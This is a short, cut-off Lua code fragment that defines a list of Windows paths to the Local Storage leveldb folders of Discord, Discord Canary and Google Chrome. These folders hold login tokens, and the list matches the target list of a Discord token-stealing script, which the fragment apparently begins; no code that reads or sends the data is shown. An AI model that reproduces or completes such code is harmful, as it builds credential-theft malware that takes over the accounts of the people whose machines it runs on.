local roots = {
    AP and (AP .. "\\discord\\Local Storage\\leveldb"),
    AP and (AP .. "\\discordcanary\\Local Storage\\leveldb"),
    LA and (LA .. "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
